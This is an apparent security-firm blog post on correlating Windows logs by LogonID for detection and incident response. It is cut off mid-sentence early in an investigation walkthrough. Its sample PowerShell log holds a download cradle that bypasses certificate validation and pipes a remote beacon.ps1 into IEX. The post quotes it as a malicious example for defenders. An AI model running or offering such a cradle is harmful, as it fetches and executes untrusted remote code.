---
title: Building a Detection Foundation: Part 5 - Correlation in Practice
url: https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice
source: TrustedSec
date: 2026-04-07
fetch_date: 2026-04-08T04:38:34.511702
---

# Building a Detection Foundation: Part 5 - Correlation in Practice

[Skip to Main Content](#main)

[TrustedSec](https://trustedsec.com/)

* [Solutions](https://trustedsec.com/solutions)

  ## Solutions

  Our custom solutions are tailored to address the unique challenges of different roles in security.

  [Solutions](https://trustedsec.com/solutions)

  + [01

    For Leadership

    We understand the challenges facing modern executives and develop solutions unique to leaders.](https://trustedsec.com/solutions/for-leadership)
  + [02

    For Operations

    We stay one step ahead to proactively safeguard our clients and partners.](https://trustedsec.com/solutions/for-operations)
  + [03

    For Infrastructure

    From architecture to resiliency and maintainability, we keep your tech aligned to best practices.](https://trustedsec.com/solutions/for-infrastructure)
  + [04

    For Assurance

    Our compliance experts guide partners through regulatory requirements to ensure standards are met.](https://trustedsec.com/solutions/for-assurance)
* [Services](https://trustedsec.com/services)

  ## Services

  From building to testing to hardening, our services support security at every stage.

  [Services](https://trustedsec.com/services)

  + [01

    Design

    Design an exceptional, custom security program alongside our security experts.](https://trustedsec.com/services/design)
  + [02

    Evaluate

    Evaluate your security program with proven assessment methodologies.](https://trustedsec.com/services/evaluate)
  + [03

    Harden

    Harden your security program with the help of our security experts.](https://trustedsec.com/services/harden)
  + [04

    Respond

    Respond to threats to your security program with the help of our security experts.](https://trustedsec.com/services/respond)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

  ## About Us

  Driven by purpose, fueled by experts.

  [About Us](https://trustedsec.com/about-us)

  + [01

    Our Team

    Meet our security experts.](https://trustedsec.com/about-us/our-team)
  + [02

    Our Partners

    Become a TrustedSec partner to help your customers anticipate and prepare for potential attacks.](https://trustedsec.com/about-us/our-partners)
  + [03

    News

    Our team is trusted by local and national media to be the subject matter experts for security news.](https://trustedsec.com/about-us/news)
  + [04

    Events

    See our upcoming webinars, conferences, talks, trainings, and more!](https://trustedsec.com/about-us/events)

Search

Menu

Search Input

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Solutions](https://trustedsec.com/solutions)
* [Services](https://trustedsec.com/services)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Blog](https://trustedsec.com/blog)
* [Building a Detection Foundation: Part 5 - Correlation in Practice](https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice)

April 07, 2026

# Building a Detection Foundation: Part 5 - Correlation in Practice

Written by
Carlos Perez

Threat Hunting
Incident Response

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BuildingDetectionFoundation-Pt5_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1774978839&s=807c28b94ac1da69efd86351b4d469fd)

Table of contents

* [The Correlation Model](#Model)
* [The LogonID Thread](#Thread)
* [A Real Investigation Flow](#Flow)
* [Building Detections That Use Correlation](#Building)
* [Practical Detection Examples](#Examples)
* [Building a Correlation Playbook](#Playbook)
* [The Value of Redundancy](#Redundancy)
* [Final Thoughts](#Final)

Share

* Share URL
* [Share via Email](/cdn-cgi/l/email-protection#c4fbb7b1a6aea1a7b0f987aca1a7afe1f6f4abb1b0e1f6f4b0acadb7e1f6f4a5b6b0ada7a8a1e1f6f4a2b6aba9e1f6f490b6b1b7b0a1a097a1a7e1f6f5e2a5a9b4ffa6aba0bdf986b1ada8a0adaaa3e1f6f4a5e1f6f480a1b0a1a7b0adabaae1f6f482abb1aaa0a5b0adabaae1f785e1f6f494a5b6b0e1f6f4f1e1f6f4e9e1f6f487abb6b6a1a8a5b0adabaae1f6f4adaae1f6f494b6a5a7b0ada7a1e1f785e1f6f4acb0b0b4b7e1f785e1f682e1f682b0b6b1b7b0a1a0b7a1a7eaa7aba9e1f682a6a8aba3e1f682a6b1ada8a0adaaa3e9a5e9a0a1b0a1a7b0adabaae9a2abb1aaa0a5b0adabaae9b4a5b6b0e9f1e9a7abb6b6a1a8a5b0adabaae9adaae9b4b6a5a7b0ada7a1 "Share via Email")
* [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-5-correlation-in-practice "Share on Facebook")
* [Share on X](http://twitter.com/share?text=Building%20a%20Detection%20Foundation%3A%20Part%205%20-%20Correlation%20in%20Practice%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-5-correlation-in-practice "Share on X")
* [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fbuilding-a-detection-foundation-part-5-correlation-in-practice&mini=true "Share on LinkedIn")

## From Data Sources to Detection

We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.

But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work *together*—in detection engineering and Incident Response.

As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.

## The Correlation Model

At the heart of Windows forensics and detection is a simple concept: **every action happens in a context**. That context is defined by:

* **Who:** The user account and session
* **What:** The process, command, or action
* **When:** The timestamp
* **Where:** The system, and potentially the source system for remote activity
* **How:** The parent process, the logon type, the network path

Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.

## The LogonID Thread

I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.

When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:

* **Event 4688 / Sysmon Event 1:** Process creation by that session
* **Events 4656, 4663:** Object access by that session
* **Event 4672:** Special privileges for that session
* **PowerShell 4103, 4104:** Script execution by that session
* **Sysmon Event 3:** Network connections by processes in that session

This means you can take any suspicious event and trace it back to:

1. The session it belongs to
2. All other activity within that session
3. The authentication event that created the session

## A Real Investigation Flow

Let me walk through a realistic scenario that demonstrates this correlation.

**Initial Alert:** Your SIEM detects a suspicious PowerShell script block (Event 4104):

```
Event ID: 4104
TimeCreated: 2024-03-15 14:23:45
ScriptBlockText:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object System.Net.WebClient
$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
```

This is a download cradle with certificate validation bypass. Clearly malicious. Now what?

**Step 1: Identify the session**

Look at the same event's metadata to get the user context and Security ID.

**Step 2: Find the process context (Sysmon Event 1)**

Query for ***powershell...